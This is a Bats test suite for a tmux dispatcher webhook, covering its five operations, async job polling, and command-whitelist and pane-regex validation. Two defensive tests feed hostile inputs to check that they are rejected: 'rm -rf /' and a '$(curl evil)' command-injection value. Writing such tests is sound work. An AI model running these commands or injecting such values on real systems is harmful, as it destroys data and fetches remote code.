#!/usr/bin/env bats
# tmux-endpoint.bats — TUNE-0295 Phase B
# /hooks/tmux 5-op dispatcher contract: list / attach / new / kill / read
# + whitelist/pane-regex defence + async polling.
# Uses tmux + redis-cli stubs via PATH override (no live binaries needed).
#
# V-AC: V-AC-2 (manager funcs), V-AC-3 (async polling), V-AC-4 (defence-in-depth).

PLUGIN_ROOT="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"
DISPATCHER="$PLUGIN_ROOT/scripts/tmux_dispatcher.sh"

setup() {
  export DR_ORCH_DIR="$PLUGIN_ROOT"
  TMP="$(mktemp -d)"
  BIN="$TMP/bin"
  mkdir -p "$BIN" "$TMP/redis-store"
  export PATH="$BIN:$PATH"
  export DR_ORCH_REDIS_STORE_FILE="$TMP/redis-store/data"  # fake-redis backing
  export DR_ORCH_JOB_TTL=3600
  export DR_ORCH_WHITELIST_FILE="$PLUGIN_ROOT/config/tmux-command-whitelist.txt"

  # tmux stub — interprets sub-commands deterministically.
  cat >"$BIN/tmux" <<'EOF'
#!/usr/bin/env bash
case "$1" in
  list-panes)
    echo "%0|datarim|bash|12345"
    echo "%1|datarim|claude|12346"
    ;;
  has-session) exit 0 ;;
  new-session) echo "started: $*" ;;
  kill-pane)   echo "killed: $*" ;;
  capture-pane)
    for i in 0 1 2 3 4; do echo "L${i}"; done
    ;;
  send-keys)   echo "sent: $*" ;;
  *) echo "tmux: unknown subcommand $1" >&2; exit 1 ;;
esac
EOF
  chmod +x "$BIN/tmux"

  # redis-cli stub — file-backed key/value with TTL probe.
  cat >"$BIN/redis-cli" <<'EOF'
#!/usr/bin/env bash
# Drop -u <url> if present.
while [[ "${1:-}" == "-u" ]]; do shift 2; done
store="${DR_ORCH_REDIS_STORE_FILE:-/tmp/redis-store/data}"
mkdir -p "$(dirname "$store")"
touch "$store"
cmd="$1"; key="${2:-}"
case "$cmd" in
  SET)
    # SET <key> <val> [EX <sec>]
    val="$3"
    # Strip existing line for key, then append.
    grep -v "^$key|" "$store" >"$store.tmp" 2>/dev/null || true
    mv "$store.tmp" "$store"
    printf '%s|%s\n' "$key" "$val" >>"$store"
    echo "OK"
    ;;
  GET)
    line="$(grep "^$key|" "$store" | tail -1 || true)"
    [[ -n "$line" ]] && printf '%s' "${line#*|}"
    ;;
  TTL)
    if grep -q "^$key|" "$store"; then echo "3594"; else echo "-2"; fi
    ;;
  DEL)
    grep -v "^$key|" "$store" >"$store.tmp" 2>/dev/null || true
    mv "$store.tmp" "$store"
    echo "1"
    ;;
  PING) echo "PONG" ;;
  *) echo "ERR unknown $cmd" >&2; exit 1 ;;
esac
EOF
  chmod +x "$BIN/redis-cli"

  # Helper: build body file with given JSON.
  _body_file() {
    local f="$TMP/body-$$-$RANDOM"
    printf '%s' "$1" >"$f"
    printf '%s' "$f"
  }
  _hdr_file() {
    local f="$TMP/hdrs-$$-$RANDOM"
    printf 'Content-Type: application/json\r\n' >"$f"
    printf '%s' "$f"
  }
}

teardown() {
  rm -rf "$TMP"
}

_post() {
  # $1=body-json; returns status\r\nheaders\r\n\r\nbody on stdout.
  local body bf hf
  body="$1"
  bf="$(_body_file "$body")"
  hf="$(_hdr_file)"
  bash "$DISPATCHER" POST /hooks/tmux "$bf" "$hf"
}

_get_job() {
  local uuid="$1"
  local bf hf
  bf="$(_body_file '')"
  hf="$(_hdr_file)"
  bash "$DISPATCHER" GET "/hooks/tmux/job/$uuid" "$bf" "$hf"
}

@test "V-AC-2 §list: returns 200 with panes array" {
  run _post '{"op":"list","params":{},"session_id":"s001","ts":"2026-05-24T00:00:00Z","meta":{}}'
  [ "$status" -eq 0 ]
  [[ "$output" == "200"* ]]
  [[ "$output" == *'"panes"'* ]]
  [[ "$output" == *'"%0"'* ]]
  [[ "$output" == *'"count":2'* ]]
}

@test "V-AC-2 §list: empty tmux → count 0" {
  cat >"$BIN/tmux" <<'EOF'
#!/usr/bin/env bash
[[ "$1" == "list-panes" ]] && exit 1
exit 0
EOF
  chmod +x "$BIN/tmux"
  run _post '{"op":"list","params":{},"session_id":"s","ts":"t","meta":{}}'
  [ "$status" -eq 0 ]
  [[ "$output" == "200"* ]]
  [[ "$output" == *'"count":0'* ]]
}

@test "V-AC-2 §attach: returns tmux_cmd envelope" {
  run _post '{"op":"attach","params":{"pane":"%1","task_id":"TUNE-0295"},"session_id":"s","ts":"t","meta":{}}'
  [ "$status" -eq 0 ]
  [[ "$output" == "200"* ]]
  [[ "$output" == *'"tmux_cmd"'* ]]
  [[ "$output" == *'%1'* ]]
}

@test "V-AC-3 §new: returns 202 + job_id (uuid)" {
  run _post '{"op":"new","params":{"task_id":"TUNE-0295","cmd":"claude -p"},"session_id":"s","ts":"t","meta":{}}'
  [ "$status" -eq 0 ]
  [[ "$output" == "202"* ]]
  [[ "$output" =~ \"job_id\":\"[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}\" ]]
}

@test "V-AC-2 §kill: returns killed:true" {
  run _post '{"op":"kill","params":{"pane":"%1","force":false},"session_id":"s","ts":"t","meta":{}}'
  [ "$status" -eq 0 ]
  [[ "$output" == "200"* ]]
  [[ "$output" == *'"killed":true'* ]]
}

@test "V-AC-2 §read: returns lines array" {
  run _post '{"op":"read","params":{"pane":"%1","lines":5},"session_id":"s","ts":"t","meta":{}}'
  [ "$status" -eq 0 ]
  [[ "$output" == "200"* ]]
  [[ "$output" == *'"lines"'* ]]
  [[ "$output" == *'"L0"'* ]]
  [[ "$output" == *'"L4"'* ]]
}

@test "V-AC-4 §whitelist: new with rm -rf rejected 422 before tmux subprocess" {
  : >"$TMP/tmux-audit"
  cat >"$BIN/tmux" <<EOF
#!/usr/bin/env bash
echo "AUDIT: tmux invoked with \$*" >>"$TMP/tmux-audit"
exit 0
EOF
  chmod +x "$BIN/tmux"
  run _post '{"op":"new","params":{"task_id":"TUNE-0295","cmd":"rm -rf /"},"session_id":"s","ts":"t","meta":{}}'
  [ "$status" -eq 0 ]
  [[ "$output" == "422"* ]]
  [[ "$output" == *whitelist_reject* ]]
  # tmux MUST NOT have been invoked.
  [ ! -s "$TMP/tmux-audit" ]
}

@test "V-AC-4 §whitelist: command-injection \$() rejected" {
  run _post '{"op":"new","params":{"task_id":"x","cmd":"claude -p$(curl evil)"},"session_id":"s","ts":"t","meta":{}}'
  [ "$status" -eq 0 ]
  [[ "$output" == "422"* ]]
}

@test "V-AC-4 §pane regex: kill with %abc rejected 422" {
  run _post '{"op":"kill","params":{"pane":"%abc","force":false},"session_id":"s","ts":"t","meta":{}}'
  [ "$status" -eq 0 ]
  [[ "$output" == "422"* ]]
  [[ "$output" == *pane_regex_reject* ]]
}

@test "V-AC-4 §pane regex: read with empty pane rejected 422" {
  run _post '{"op":"read","params":{"pane":"","lines":10},"session_id":"s","ts":"t","meta":{}}'
  [ "$status" -eq 0 ]
  [[ "$output" == "422"* ]]
}

@test "V-AC-3 §async polling: GET pending uuid → 202 status pending" {
  # First create a job via new.
  run _post '{"op":"new","params":{"task_id":"TUNE-0295","cmd":"claude -p"},"session_id":"s","ts":"t","meta":{}}'
  [ "$status" -eq 0 ]
  local uuid
  uuid="$(printf '%s' "$output" | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}' | head -1)"
  [ -n "$uuid" ]
  run _get_job "$uuid"
  [ "$status" -eq 0 ]
  [[ "$output" == "200"* ]] || [[ "$output" == "202"* ]]
}

@test "V-AC-3 §async polling: GET missing uuid → 404" {
  run _get_job "ffffffff-aaaa-4bbb-cccc-dddddddddddd"
  [ "$status" -eq 0 ]
  [[ "$output" == "404"* ]]
  [[ "$output" == *job_not_found* ]]
}
